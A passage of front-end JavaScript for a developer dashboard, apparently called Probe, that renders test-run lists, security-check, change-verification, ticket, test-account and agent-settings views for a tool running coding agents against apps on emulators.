$view.querySelectorAll("button[data-side]").forEach((b) => b.addEventListener("click", () => { fl.side = b.dataset.side; renderCards(); }));\n  $view.querySelectorAll("#clv button").forEach((b) => b.addEventListener("click", () => { fl.level = b.dataset.l; renderCards(); }));\n  $view.querySelectorAll("#cst button").forEach((b) => b.addEventListener("click", () => { fl.status = b.dataset.s; renderCards(); }));\n  document.getElementById("rerunold")?.addEventListener("click", async (e) => {\n    e.target.disabled = true;\n    const res = await post("/api/verify", { outdated: true, features: [f.id] });\n    if (res.error) { alert(res.error); e.target.disabled = false; return; }\n    followRun(res.runId, document.getElementById("runpanel"), () => renderCards());\n  });\n  const approveAll = document.getElementById("approveall");\n  if (approveAll) approveAll.addEventListener("click", async () => {\n    if (!confirm(`Approve all ${f.draft} draft cards of ${f.id}? Approved cards run on a device in every verify.`)) return;\n    approveAll.disabled = true;\n    for (const c of f.cards.filter((x) => x.status === "draft")) await post(`/api/cards/${encodeURIComponent(c.feature)}/${encodeURIComponent(c.id)}/status`, { status: "approved" });\n    renderCards();\n  });\n  bindBackfillAll();\n}\n\nfunction bindBackfillAll() {\n  document.getElementById("bfall")?.addEventListener("click", async (e) => {\n    if (!confirm("Draft cards for every feature that has none? This runs one agent per feature and can take a while.")) return;\n    e.target.disabled = true;\n    const res = await post("/api/cards/*/backfill");\n    if (res.error) { alert(res.error); e.target.disabled = false; return; }\n    followRun(res.runId, document.getElementById("runpanel"), () => { state.scan = null; renderCards(); });\n  });\n}\n\n// \u2500\u2500 Runs: a filtered list with the selected run beside it, and a link (#runs/<id>) for each \u2500\u2500\n\nconst RUNS_PAGE = 50;\nconst TRIGGER = { claude: "Claude", agent: "an agent\'s", commit: "commit", editor: "editor", manual: "manual" };\nconst PROBLEM = new Set(["failed", "error"]);\n\nfunction runsState() {\n  if (!state.runs) state.runs = { data: null, kind: "all", status: "all", feature: "all", q: "", limit: RUNS_PAGE, selected: null };\n  return state.runs;\n}\n\nfunction runResult(r) {\n  if (r.kind === "backfill") return `${(r.written || []).length} cards \xB7 $${(r.costUsd || 0).toFixed(2)}`;\n  if (r.kind === "card") return `${esc(r.cardId)} \xB7 ${(r.timeline || []).length} steps \xB7 $${(r.costUsd || 0).toFixed(2)}${r.perf?.issues?.length ? ` \xB7 <span style="color:var(--warn)">perf \u26A0</span>` : ""}`;\n  if (r.kind === "verify") return `vs ${esc(r.base)} \xB7 ${r.features.length} features \xB7 ${r.features.reduce((n, f) => n + f.cards.filter((c) => c.runId).length, 0)} card runs`;\n  if (r.kind === "explore") return `${r.screens.length} screens \xB7 ${r.issues.length} issues`;\n  if (r.kind === "login") return r.login ? (r.login.state === "logged_in" ? (r.login.role ? `as ${esc(r.login.role)}` : "non-test account") : r.login.state.replace("_", " ")) : "\u2014";\n  if (r.kind === "unitwrite") return `${r.files.length} files \xB7 $${(r.costUsd || 0).toFixed(2)}`;\n  if (r.kind === "check") return (r.features || []).map((f) => `${esc(f.feature)} <span class="pill ${f.unitStatus || "none"}">${f.unitStatus || "\u2014"}</span>${f.draftId ? " \u270E" : ""}`).join(" ") || "nothing stale";\n  if (r.kind === "fix") return `${esc(r.issue.title.slice(0, 70))} \xB7 ${r.files.length} files`;\n  if (r.kind === "init") return `${(r.drafts || []).length} drafts`;\n  if (r.kind === "security") return `${(r.findings || []).length} open${(r.findings || []).some((f) => f.severity === "critical") ? ` \xB7 <strong style="color:var(--fail)">${r.findings.filter((f) => f.severity === "critical").length} critical</strong>` : ""}`;\n  const results = r.results || [];\n  const t = results.reduce((n, x) => n + x.tests, 0), f = results.reduce((n, x) => n + x.failed, 0);\n  if (r.status === "error" && !t) return `<span style="color:var(--fail)">build failed</span>`;\n  return `${t} tests${f ? ` \xB7 <strong style="color:var(--fail)">${f} failed</strong>` : ""}`;\n}\n\nfunction filteredRuns() {\n  const s = runsState();\n  const q = s.q.trim().toLowerCase();\n  return s.data.filter((r) =>\n    (s.kind === "all" || r.kind === s.kind) &&\n    (s.status === "all" || (s.status === "problems" ? PROBLEM.has(r.status) : r.status === s.status)) &&\n    (s.feature === "all" || r.feature === s.feature || (r.features || []).some((f) => f.feature === s.feature)) &&\n    (!q || [r.id, r.feature, r.cardId, r.kind].some((x) => String(x || "").toLowerCase().includes(q))));\n}\n\nasync function renderRuns() {\n  const s = runsState();\n  $view.innerHTML = `<div class="empty">Loading runs\u2026</div>`;\n  s.data = await api("/api/runs");\n  if (!s.data.length) { $view.innerHTML = `<div class="empty">No runs yet. Open a feature in Atlas and run its unit tests.</div>`; return; }\n  const kinds = [...new Set(s.data.map((r) => r.kind))].sort();\n  const features = [...new Set(s.data.flatMap((r) => [r.feature, ...(r.features || []).map((f) => f.feature)]).filter((f) => f && f !== "*"))].sort();\n  const opt = (v, label, cur) => `<option value="${esc(v)}" ${v === cur ? "selected" : ""}>${esc(label)}</option>`;\n  $view.innerHTML = `<div class="runs-layout">\n    <section class="runs-list">\n      <div class="filters">\n        <select id="fk" title="Kind">${opt("all", "All kinds", s.kind)}${kinds.map((k) => opt(k, k, s.kind)).join("")}</select>\n        <select id="fs" title="Status">${opt("all", "Any status", s.status)}${opt("problems", "Failed or error", s.status)}${["passed", "running", "stopped"].map((k) => opt(k, k, s.status)).join("")}</select>\n        <select id="ff" title="Feature">${opt("all", "All features", s.feature)}${features.map((f) => opt(f, f, s.feature)).join("")}</select>\n        <input id="fq" type="search" placeholder="Search run, card\u2026" value="${esc(s.q)}">\n      </div>\n      <div id="runrows"></div>\n    </section>\n    <aside class="runs-detail" id="rundetail"></aside>\n  </div>`;\n  const bind = (id, key, ev = "change") => document.getElementById(id).addEventListener(ev, (e) => { s[key] = e.target.value; s.limit = RUNS_PAGE; renderRunRows(); });\n  bind("fk", "kind"); bind("fs", "status"); bind("ff", "feature"); bind("fq", "q", "input");\n  renderRunRows();\n  // Opened from a link: bring its row into view too, showing more of the list if it is further down.\n  if (s.selected) {\n    const at = filteredRuns().findIndex((r) => r.id === s.selected);\n    if (at >= s.limit) { s.limit = Math.ceil((at + 1) / RUNS_PAGE) * RUNS_PAGE; renderRunRows(); }\n    document.querySelector("#runrows tr.sel")?.scrollIntoView({ block: "center" });\n    showRun(s.selected);\n  }\n  else document.getElementById("rundetail").innerHTML = `<div class="empty">Select a run to see its result, evidence and fixes.</div>`;\n}\n\nfunction renderRunRows() {\n  const s = runsState();\n  const all = filteredRuns();\n  const shown = all.slice(0, s.limit);\n  const el = document.getElementById("runrows");\n  if (!el) return;\n  el.innerHTML = !all.length ? `<div class="empty">No runs match these filters.</div>` : `<table><thead><tr><th>When</th><th>Feature</th><th>Kind</th><th>Status</th><th>Result</th></tr></thead><tbody>\n    ${shown.map((r) => `<tr class="click${r.id === s.selected ? " sel" : ""}" data-id="${esc(r.id)}">\n      <td><span title="${esc(r.finishedAt || r.startedAt)}">${ago(r.finishedAt || r.startedAt)}</span><br><span class="mono muted" style="font-size:11px">${esc(r.id)}</span></td>\n      <td>${esc(r.feature)}</td><td>${esc(r.kind)}</td>\n      <td><span class="pill ${r.status}">${r.status}</span>${r.status === "running" ? ` <button class="btn stop" data-stop="${esc(r.id)}">\u25A0 Stop</button>` : ""}</td>\n      <td class="res">${runResult(r)}</td></tr>`).join("")}</tbody></table>`;\n  el.insertAdjacentHTML("beforeend", `<div class="count"><span>${shown.length} of ${all.length} runs${all.length < s.data.length ? ` (${s.data.length} in all)` : ""}</span>${all.length > shown.length ? `<button class="btn secondary" id="rmore">Show ${Math.min(RUNS_PAGE, all.length - shown.length)} more</button>` : ""}</div>`);\n  el.querySelectorAll("tr.click").forEach((tr) => tr.addEventListener("click", () => selectRun(tr.dataset.id)));\n  el.querySelector("#rmore")?.addEventListener("click", () => { s.limit += RUNS_PAGE; renderRunRows(); });\n  el.querySelectorAll("button[data-stop]").forEach((b) => b.addEventListener("click", async (e) => {\n    e.stopPropagation();\n    if (!confirm(`Stop run ${b.dataset.stop}?`)) return;\n    b.disabled = true;\n    const res = await stopRunReq(b.dataset.stop);\n    if (res.error) alert(res.error);\n    setTimeout(renderRuns, 1500);\n  }));\n}\n\n/** Opens a run beside the list and puts it in the address, so the link reopens it. */\nfunction selectRun(id) {\n  runsState().selected = id;\n  saveRoute();\n  document.querySelectorAll("#runrows tr.click").forEach((tr) => tr.classList.toggle("sel", tr.dataset.id === id));\n  showRun(id);\n}\n\nfunction closeRun() {\n  closeStream();\n  runsState().selected = null;\n  saveRoute();\n  document.querySelectorAll("#runrows tr.sel").forEach((tr) => tr.classList.remove("sel"));\n  const panel = document.getElementById("rundetail");\n  panel.classList.remove("open");\n  panel.innerHTML = `<div class="empty">Select a run to see its result, evidence and fixes.</div>`;\n}\n\nfunction showRun(id) {\n  const panel = document.getElementById("rundetail");\n  if (!panel) return;\n  panel.classList.add("open");\n  panel.scrollTop = 0;\n  panel.innerHTML = `<div class="dhead"><button class="btn secondary" id="rlink" title="Copy a link to this run">\u29C9 Link</button><button class="btn secondary" id="rclose" title="Close">\u2715</button></div><div id="rbody"></div>`;\n  panel.querySelector("#rclose").addEventListener("click", closeRun);\n  panel.querySelector("#rlink").addEventListener("click", (e) => navigator.clipboard.writeText(location.href).then(() => { e.target.textContent = "Copied"; }));\n  // A run that ends while it is open refreshes the list, so its row shows how it ended.\n  followRun(id, panel.querySelector("#rbody"), () => api("/api/runs").then((runs) => { runsState().data = runs; renderRunRows(); }));\n}\n\nasync function renderSecurity() {\n  $view.innerHTML = `<div class="empty">Loading security results\u2026</div>`;\n  const [sec, sc] = await Promise.all([api("/api/security"), state.scan ? Promise.resolve(state.scan) : api("/api/scan")]);\n  state.scan = sc;\n  const last = sec.latest;\n  $view.innerHTML = `\n    <div class="box"><h3>Security checks</h3>\n      <p class="muted" style="margin-top:0">${sec.rules} rules picked by what the project is (Android, iOS, web, backends, cross-platform, desktop, Docker, CI, IaC), dependencies against OSV, secrets in git history, the built app on disk, and the running app (a local URL, the installed Android app on an emulator). The agent review reads the code for authorization and logic flaws; it costs an agent run per feature. The full catalog is in <code class="mono">docs/security/</code>.</p>\n      <form class="inline" id="sf">\n        <label>Scope<select name="feature"><option value="">Whole project</option>${(sc.features || []).map((f) => `<option>${esc(f.id)}</option>`).join("")}</select></label>\n        <label>Running app URL<input name="url" placeholder="${esc(sec.url || "http://localhost:3000")}" style="width:220px"></label>\n        <label class="check"><input type="checkbox" name="agent"> agent code review</label>\n        <button class="btn" type="submit" data-job="${esc(jobKey.security(""))}" data-busy="Checking\u2026">\u26E8 Run security checks</button>\n      </form>\n    </div>\n    <div id="runpanel">${last ? `<div class="box"><h3>Last run <a href="#" data-open="${esc(last.id)}" class="mono" style="font-weight:400">${esc(last.id)}</a> <span class="pill ${esc(last.status)}">${esc(last.status)}</span> <span class="muted" style="font-weight:400">${ago(last.finishedAt || last.startedAt)}</span></h3>${resultsTable(last)}<div id="ri"></div></div>` : `<div class="empty">No security run yet.</div>`}</div>\n    ${sec.dismissed.length ? `<div class="box"><h3>Dismissed (${sec.dismissed.length})</h3><table><thead><tr><th>Check</th><th>Where</th><th>Reason</th><th></th></tr></thead><tbody>${sec.dismissed.map((d) => `<tr><td class="mono">${esc(d.check)}</td><td class="mono muted">${esc(d.file || "\u2014")}</td><td>${esc(d.reason)}<br><span class="muted" style="font-size:12px">${ago(d.at)}</span></td><td><button class="btn secondary" data-undismiss="${esc(d.fingerprint)}">Undo</button></td></tr>`).join("")}</tbody></table></div>` : ""}`;\n  const panel = document.getElementById("runpanel");\n  if (last) renderIssues(last, panel.querySelector("#ri"), panel);\n  panel.querySelectorAll("a[data-open]").forEach((a) => a.addEventListener("click", (ev) => { ev.preventDefault(); state.tab = "runs"; runsState().selected = a.dataset.open; render(); }));\n  document.querySelectorAll("[data-undismiss]").forEach((b) => b.addEventListener("click", async () => {\n    await post("/api/security/undismiss", { fingerprint: b.dataset.undismiss });\n    renderSecurity();\n  }));\n  const sf = document.getElementById("sf");\n  sf.addEventListener("submit", async (e) => {\n    e.preventDefault();\n    if (sf.agent.checked && !confirm("The agent review runs one agent per feature (minutes each, billed to your agent plan). Start?")) return;\n    const res = await post("/api/security", { feature: sf.feature.value || undefined, agent: sf.agent.checked, url: sf.url.value.trim() || undefined });\n    if (res.error) return alert(res.error);\n    followRun(res.runId, panel, () => {});\n  });\n}\n\nasync function renderVerify() {\n  if (!state.verify) state.verify = { base: "" };\n  $view.innerHTML = `<div class="empty">Reading the change\u2026</div>`;\n  const [ch, br] = await Promise.all([api("/api/changes" + (state.verify.base ? `?base=${encodeURIComponent(state.verify.base)}` : "")), api("/api/branch?branches")]);\n  const here = br.git ? `<strong>${esc(br.id)}</strong> @ <span class="mono">${esc(br.git.commit)}</span>${br.git.dirty ? ` + ${br.git.dirty} uncommitted file(s)` : ""}` : "no git";\n  $view.innerHTML = `\n    <div class="box"><h3>Verify this change</h3>\n      <p style="margin-top:0">Testing ${here}${ch.base ? ` against <strong>${esc(ch.base)}</strong>` : ""}.</p>\n      ${br.warnings.length ? `<ul style="color:var(--warn);margin-top:0">${br.warnings.map((w) => `<li>${esc(w)}</li>`).join("")}</ul>` : ""}\n      <p class="muted" style="margin-top:0">Files changed since the base branch, plus uncommitted and untracked work, mapped to features. Verify runs their unit tests, then reinstalls the app from this code and runs their cards on an emulator.</p>\n      <form class="inline" id="vf">\n        <label>Compare with<select name="base">${(br.branches.includes(ch.base) || !ch.base ? br.branches : [ch.base, ...br.branches]).map((b) => `<option ${b === ch.base ? "selected" : ""}>${esc(b)}</option>`).join("")}</select></label>\n        <label>Max card runs<input name="maxCards" type="number" min="0" max="50" style="width:90px" placeholder="10"></label>\n        <label class="check"><input type="checkbox" name="allCards"> include draft cards</label>\n        <label class="check"><input type="checkbox" name="noDevice"> unit tests only</label>\n        <button class="btn" type="submit" data-job="${esc(jobKey.verifyBase(ch.base))}" data-busy="Verifying\u2026" ${ch.features.length ? "" : "disabled"}>\u2713 Verify ${ch.features.length} feature${ch.features.length === 1 ? "" : "s"}</button>\n        <button class="btn secondary" type="button" id="vrefresh">Refresh</button>\n      </form>\n      <div style="margin-top:12px">${ch.base ? `${ch.files.length} changed files vs <strong>${esc(ch.base)}</strong>` : `<span style="color:var(--fail)">No base branch found; enter one.</span>`}</div>\n      ${ch.features.length ? `<table style="margin-top:8px"><thead><tr><th>Feature</th><th>Changed files</th></tr></thead><tbody>${ch.features.map((f) => `<tr><td><strong>${esc(f.feature)}</strong></td><td class="mono muted">${f.files.slice(0, 6).map(esc).join("<br>")}${f.files.length > 6 ? `<br>\u2026 ${f.files.length - 6} more` : ""}</td></tr>`).join("")}</tbody></table>` : ""}\n      ${ch.unowned.length ? `<details style="margin-top:8px"><summary class="muted">${ch.unowned.length} files outside any module</summary><p class="mono muted">${ch.unowned.map(esc).join("<br>")}</p></details>` : ""}\n    </div>\n    <div class="box"><h3>From a ticket</h3>\n      <form class="inline" id="tf">\n        <label>Ticket<input name="ticket" placeholder="PROJ-1234" required></label>\n        <button class="btn secondary" type="button" id="tlook">Look up</button>\n        <button class="btn secondary" type="button" id="tverify" title="Unit tests and cards of the features this ticket\'s commits touched, its own cards first">\u2713 Verify ticket</button>\n      </form>\n      <div id="tinfo"></div>\n      <form class="inline" id="tc" style="margin-top:10px">\n        <label style="flex:1 1 100%">Ticket text (optional: paste the description and acceptance criteria)<textarea name="text" placeholder="As a user I can\u2026"></textarea></label>\n        <label>Feature(s), when no commit names the ticket yet<input name="features" placeholder="comment, chat"></label>\n        <button class="btn" type="submit">\u2726 Draft cards from ticket</button>\n      </form>\n    </div>\n    <div id="runpanel"></div>`;\n  const vf = document.getElementById("vf");\n  document.getElementById("vrefresh").addEventListener("click", () => { state.verify.base = vf.base.value; renderVerify(); });\n  vf.base.addEventListener("change", () => { state.verify.base = vf.base.value; renderVerify(); });\n  vf.addEventListener("submit", async (e) => {\n    e.preventDefault();\n    const res = await post("/api/verify", { base: vf.base.value || undefined, noDevice: vf.noDevice.checked, cards: vf.allCards.checked ? "all" : undefined, maxCards: vf.maxCards.value ? Number(vf.maxCards.value) : undefined });\n    if (res.error) return alert(res.error);\n    followRun(res.runId, document.getElementById("runpanel"), () => { state.scan = null; });\n  });\n  const tf = document.getElementById("tf");\n  const ticket = () => tf.ticket.value.trim();\n  document.getElementById("tlook").addEventListener("click", async () => {\n    if (!ticket()) return;\n    const t = await api("/api/tickets/" + encodeURIComponent(ticket()));\n    document.getElementById("tinfo").innerHTML = `<div style="margin-top:10px">${t.url ? `<a href="${esc(t.url)}" target="_blank">${esc(t.id)}</a>` : `<strong>${esc(t.id)}</strong>`} \xB7 features: ${t.features.map(esc).join(", ") || "none"} \xB7 cards: ${t.cards.map(esc).join(", ") || "none"}\n      <ul class="mono muted">${t.commits.map((c) => `<li>${esc(c.hash)} ${esc(c.date)} ${esc(c.subject)}</li>`).join("") || "<li>No commits mention it.</li>"}</ul></div>`;\n  });\n  document.getElementById("tverify").addEventListener("click", async () => {\n    if (!ticket()) return;\n    const res = await post("/api/verify", { ticket: ticket(), cards: "all" });\n    if (res.error) return alert(res.error);\n    followRun(res.runId, document.getElementById("runpanel"), () => { state.scan = null; });\n  });\n  document.getElementById("tc").addEventListener("submit", async (e) => {\n    e.preventDefault();\n    if (!ticket()) return alert("Enter the ticket id above.");\n    const tc = e.target;\n    const res = await post("/api/tickets/cards", { ticket: ticket(), text: tc.text.value, features: tc.features.value.split(",").map((x) => x.trim()).filter(Boolean) });\n    if (res.error) return alert(res.error);\n    followRun(res.runId, document.getElementById("runpanel"), () => { state.scan = null; });\n  });\n}\n\nasync function renderAccounts(el) {\n  const [accounts, login] = await Promise.all([api("/api/accounts"), api("/api/login")]);\n  const mark = (ok) => ok ? `<span class="pill passed">stored</span>` : `<span class="muted">\u2014</span>`;\n  const l = login && login.run.login;\n  const loginText = !l ? "Not checked yet." : l.state === "logged_in" ? (l.role ? `Logged in as <strong>${esc(l.role)}</strong>${l.seenAs ? ` (${esc(l.seenAs)})` : ""}` : `<strong style="color:var(--fail)">Logged in with an account that is not a test account</strong>${l.seenAs ? ` (${esc(l.seenAs)})` : ""} \u2014 agents will not change anything`) : l.state === "logged_out" ? "Logged out" : "Unknown";\n  el.innerHTML = `\n    <div class="box"><h3>Who the app on the device is logged in as</h3>\n      <div class="row" style="flex-wrap:wrap">${loginText} ${login ? `<span class="muted">\xB7 ${esc(login.run.device)} \xB7 ${ago(login.at)}</span>` : ""}<span style="flex:1"></span>\n        <button class="btn secondary" id="logincheck" data-job="${esc(jobKey.login())}" data-busy="Checking\u2026" title="An agent opens the app on the emulator and reports who is logged in">Check login</button></div>\n      <div id="runpanel"></div></div>`;\n  el.innerHTML += `\n    <div class="box"><h3>Test accounts</h3>\n    <p class="muted" style="margin-top:0">Accounts agents may log in with. Roles and usernames are shared with the team in <span class="mono">probe/hints/accounts.yaml</span>; passwords and login codes are encrypted on this machine only, and agents never see them \u2014 Probe types them on the device.</p>\n    ${accounts.length ? `<table><thead><tr><th>Role</th><th>Username</th><th>Shown as</th><th>Notes</th><th>Password</th><th>Login code</th><th></th></tr></thead><tbody>\n      ${accounts.map((a) => `<tr><td class="mono">${esc(a.role)}</td><td>${esc(a.username)}</td><td>${esc(a.shownAs)}</td><td class="muted">${esc(a.notes)}</td><td>${mark(a.hasPassword)}</td><td>${mark(a.hasCode)}</td>\n        <td style="white-space:nowrap"><button class="btn secondary" data-login="${esc(a.role)}" data-job="${esc(jobKey.login(a.role))}" data-busy="Logging in\u2026" ${a.hasPassword ? "" : "disabled"} title="An agent logs the app on the emulator in with this account">Log in on device</button> <button class="btn secondary" data-edit="${esc(a.role)}">Edit</button> <button class="btn secondary" data-del="${esc(a.role)}">Remove</button></td></tr>`).join("")}\n    </tbody></table>` : `<div class="empty">No test accounts yet. Without one, a card that needs login ends as blocked.</div>`}\n    <form class="acct" autocomplete="off">\n      <label>Role<input name="role" placeholder="user_a" required pattern="[\\\\w-]{1,40}"></label>\n      <label>Username<input name="username" placeholder="tester.a@example.com" required></label>\n      <label>Shown as<input name="shownAs" placeholder="@tester_a or Tester A" title="The name or handle the app shows when logged in, so agents recognise the account"></label>\n      <label>Notes<input name="notes" placeholder="main tester, has posts"></label>\n      <label>Password<input name="password" type="password" autocomplete="new-password" placeholder="unchanged if empty"></label>\n      <label>Login code<input name="code" type="password" autocomplete="off" placeholder="only if fixed"></label>\n      <button class="btn" type="submit">Save account</button>\n    </form></div>`;\n  const startLogin = async (role, b) => {\n    b.disabled = true;\n    const res = await post("/api/login", { role });\n    if (res.error) { alert(res.error); b.disabled = false; return; }\n    followRun(res.runId, el.querySelector("#runpanel"), () => renderAccounts(el));\n  };\n  el.querySelector("#logincheck").addEventListener("click", (e) => startLogin(undefined, e.target));\n  el.querySelectorAll("button[data-login]").forEach((b) => b.addEventListener("click", () => startLogin(b.dataset.login, b)));\n  const form = el.querySelector("form.acct");\n  form.addEventListener("submit", async (e) => {\n    e.preventDefault();\n    const body = Object.fromEntries(new FormData(form));\n    const res = await api("/api/accounts", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(body) });\n    if (res.error) return alert(res.error);\n    renderAccounts(el);\n  });\n  el.querySelectorAll("button[data-edit]").forEach((b) => b.addEventListener("click", () => {\n    const a = accounts.find((x) => x.role === b.dataset.edit);\n    form.role.value = a.role; form.username.value = a.username; form.shownAs.value = a.shownAs || ""; form.notes.value = a.notes || "";\n    form.password.focus();\n  }));\n  el.querySelectorAll("button[data-del]").forEach((b) => b.addEventListener("click", async () => {\n    if (!confirm(`Remove ${b.dataset.del} and its stored password?`)) return;\n    await api(`/api/accounts/${encodeURIComponent(b.dataset.del)}`, { method: "DELETE" });\n    renderAccounts(el);\n  }));\n}\n\nconst SOURCE_LABEL = { machine: "set on this machine", project: "from probe/probe.yaml (team default)", default: "Probe\'s default" };\n\n/** Why device features are off for this project, or "" when its app runs on a device. */\nfunction noDevices() {\n  return state.scan && state.scan.project.devices === false ? "Not available for this kind of project: running the app on a device needs an adapter that supports it (Android/Gradle today)." : "";\n}\n\nconst APP_SOURCE = { "probe.yaml": "set here", "last build": "found in the last build", "build file": "found in the build file", detected: "found in the project" };\n\nfunction projectBox(p) {\n  const a = p.app;\n  const real = [...new Set([...p.devices.connected.filter((d) => !d.emulator).map((d) => d.serial), ...p.devices.allowReal])];\n  const model = (serial) => p.devices.connected.find((d) => d.serial === serial)?.model;\n  const branches = p.branches || [];\n  const opt = (v, label, sel) => `<option value="${esc(v)}" ${sel ? "selected" : ""}>${esc(label)}</option>`;\n  const dev = p.devices.supported !== false;\n  return `<div class="box"><h3>Project</h3>\n    <p class="muted" style="margin-top:0">Probe fills these in from the project; leave a field empty to keep what it found. Shared settings are saved to <span class="mono">probe/probe.yaml</span> for the team (commit it), the emulator and phones only for this machine.</p>\n    <form class="inline" id="pf">\n      ${dev ? `<label>App id <span class="src">${a.package ? esc(APP_SOURCE[a.packageSource]) : "not found yet"}</span><input name="package" value="${esc(p.appSet.package || "")}" placeholder="${esc(a.package || "read after the first install")}" style="width:260px"></label>\n      <label>Install task <span class="src">${a.installTask ? esc(APP_SOURCE[a.installSource]) : "not found"}</span><input name="installTask" value="${esc(p.appSet.installTask || "")}" placeholder="${esc(a.installTask || ":app:installDebug")}" style="width:220px"></label>\n      <label>Emulator <span class="src">this machine</span><select name="avd">${opt("", p.devices.avds.length ? `Automatic (${p.devices.avds[0]})` : "Automatic (none on this machine)", !p.devices.avd)}${p.devices.avds.map((v) => opt(v, v, v === p.devices.avd)).join("")}</select></label>\n      ${real.length ? `<div style="flex:1 1 100%"><div class="muted" style="font-size:12px;font-weight:600">Real phones agents may use <span class="src">this machine \xB7 a phone usually carries someone\'s own accounts</span></div>\n        ${real.map((r) => `<label class="check"><input type="checkbox" name="allowReal" value="${esc(r)}" ${p.devices.allowReal.includes(r) ? "checked" : ""}> ${esc(r)}${model(r) ? ` (${esc(model(r))})` : " (not connected)"}</label>`).join("")}</div>` : ""}` : `<p class="muted" style="flex:1 1 100%;margin:0">${esc(p.devices.unsupported)}</p>`}\n      <label>Verify against <span class="src">base branch</span><select name="base">${opt("", `Automatic (${p.verify.defaultBase || "none found"})`, !p.verify.base)}${branches.map((b) => opt(b, b, b === p.verify.base)).join("")}</select></label>\n      <label>Cards in verify<select name="cards">${opt("approved", "Approved only", p.verify.cards === "approved")}${opt("all", "Drafts too", p.verify.cards === "all")}</select></label>\n      <label>Max card runs<input name="maxCards" type="number" min="1" max="50" value="${p.verify.maxCards}" style="width:90px"></label>\n      ${dev ? `<label>Cold start limit (ms)<input name="maxStartupMs" type="number" min="1" value="${p.perf.maxStartupMs}" style="width:110px"></label>\n      <label>Janky frames limit (%)<input name="maxJankyPct" type="number" min="1" value="${p.perf.maxJankyPct}" style="width:110px"></label>\n      <label>90th pct frame (ms)<input name="maxP90Ms" type="number" min="1" value="${p.perf.maxP90Ms}" style="width:110px"></label>\n      <label>Memory limit (MB)<input name="maxMemoryMb" type="number" min="1" value="${p.perf.maxMemoryMb ?? ""}" placeholder="none" style="width:110px"></label>` : ""}\n      <label>Ticket id pattern<input name="pattern" value="${esc(p.tickets.pattern)}" style="width:180px" class="mono"></label>\n      <label>Ticket link (<span class="mono">{id}</span>)<input name="url" value="${esc(p.tickets.url || "")}" placeholder="https://jira.example.com/browse/{id}" style="width:300px"></label>\n      <label style="flex:1 1 100%">Command that files a ticket (<span class="mono">{title}</span>, <span class="mono">{file}</span>), only ever run when someone presses File<input name="fileCommand" value="${esc(p.tickets.fileCommand || "")}" placeholder="gh issue create --title {title} --body-file {file}" class="mono"></label>\n      <button class="btn" type="submit">Save project settings</button>\n    </form>\n    <p id="pout" style="margin-bottom:0"></p>\n  </div>`;\n}\n\nfunction bindProject() {\n  const f = document.getElementById("pf");\n  f.addEventListener("submit", async (e) => {\n    e.preventDefault();\n    const num = (v) => (v === "" ? null : Number(v));\n    const body = {\n      verify: { base: f.base.value || null, cards: f.cards.value, maxCards: Number(f.maxCards.value) },\n      tickets: { pattern: f.pattern.value.trim() || null, url: f.url.value.trim() || null, fileCommand: f.fileCommand.value.trim() || null },\n    };\n    // App, device and performance fields only exist on a project whose app runs on a device.\n    if (f.package) {\n      body.app = { package: f.package.value.trim() || null, installTask: f.installTask.value.trim() || null };\n      body.devices = { avd: f.avd.value || null, allowReal: [...f.querySelectorAll("input[name=allowReal]:checked")].map((i) => i.value) };\n      body.perf = { maxStartupMs: num(f.maxStartupMs.value), maxJankyPct: num(f.maxJankyPct.value), maxP90Ms: num(f.maxP90Ms.value), maxMemoryMb: num(f.maxMemoryMb.value) };\n      for (const k of ["maxStartupMs", "maxJankyPct", "maxP90Ms"]) if (body.perf[k] === null) delete body.perf[k];\n    }\n    const res = await post("/api/project", body);\n    document.getElementById("pout").innerHTML = res.error ? `<span class="pill failed">not saved</span> ${esc(res.error)}` : `<span class="pill passed">saved</span>`;\n    if (!res.error) setTimeout(renderSettings, 700);\n  });\n}\n\nasync function renderSettings() {\n  $view.innerHTML = `<div class="empty">Reading settings\u2026</div>`;\n  const [s, p, br] = await Promise.all([api("/api/settings"), api("/api/project"), api("/api/branch?branches")]);\n  p.branches = br.branches;\n  const current = s.agents.model;\n  const runner = s.agents.runners.find((r) => r.id === s.agents.runner) ?? s.agents.runners[0];\n  const models = runner.models;\n  const known = models.some(([m]) => m === current);\n  $view.innerHTML = projectBox(p) + `<div id="acctwrap"></div>` + `\n    <div class="box"><h3>Agents</h3>\n      <p class="muted" style="margin-top:0">Every Probe agent (drafting cards, device runs, verify, writing tests) runs headless on a coding-agent CLI with your own login and plan, with Probe attached as its MCP server. Both are saved for this machine only, since each developer\'s tools and plan differ; the team default lives in <span class="mono">agents</span> in probe/probe.yaml, and a run started from the CLI can still pass <span class="mono">--model</span>.</p>\n      <form class="inline" id="sf">\n        <label>Runs on<select name="runner">${s.agents.runners.map((r) => `<option value="${r.id}" ${r.id === runner.id ? "selected" : ""}>${esc(r.label)}</option>`).join("")}</select></label>\n        <label>Model<select name="pick">${models.map(([m, label]) => `<option value="${esc(m)}" ${m === current ? "selected" : ""}>${esc(label)}</option>`).join("")}<option value="custom" ${known ? "" : "selected"}>Other\u2026</option></select></label>\n        <label id="customwrap" style="${known ? "display:none" : ""}">Model name<input name="custom" value="${known ? "" : esc(current)}" placeholder="${runner.id === "claude" ? "claude-sonnet-5-5" : "a name codex --model accepts"}"></label>\n        <button class="btn" type="submit">Save</button>\n        <button class="btn secondary" type="button" id="stest" title="Sends one tiny prompt with this model to check your plan can run it">Test on my plan</button>\n        ${s.agents.source === "machine" || s.agents.runnerSource === "machine" ? `<button class="btn secondary" type="button" id="sreset">Use team default</button>` : ""}\n      </form>\n      <p style="margin-bottom:0">In use: <strong>${esc(runner.label)}</strong> <span class="muted">\xB7 ${SOURCE_LABEL[s.agents.runnerSource]}</span> \xB7 <strong class="mono">${esc(current || "its default model")}</strong> <span class="muted">\xB7 ${SOURCE_LABEL[s.agents.source]}</span></p>\n      <p id="sout" style="margin-bottom:0"></p>\n    </div>`;\n  bindProject();\n  renderAccounts(document.getElementById("acctwrap"));\n  const form = document.getElementById("sf");\n  const chosen = () => (form.pick.value === "custom" ? form.custom.value.trim() : form.pick.value);\n  form.pick.addEventListener("change", () => { document.getElementById("customwrap").style.display = form.pick.value === "custom" ? "" : "none"; });\n  // The model list belongs to the runner, so a new runner is saved at once and the box redrawn.\n  form.runner.addEventListener("change", async () => {\n    const res = await post("/api/settings", { runner: form.runner.value });\n    if (res.error) return alert(res.error);\n    renderSettings();\n  });\n  const out = document.getElementById("sout");\n  form.addEventListener("submit", async (e) => {\n    e.preventDefault();\n    const res = await post("/api/settings", { model: chosen() });\n    if (res.error) return alert(res.error);\n    renderSettings();\n  });\n  document.getElementById("stest").addEventListener("click", async (e) => {\n    e.target.disabled = 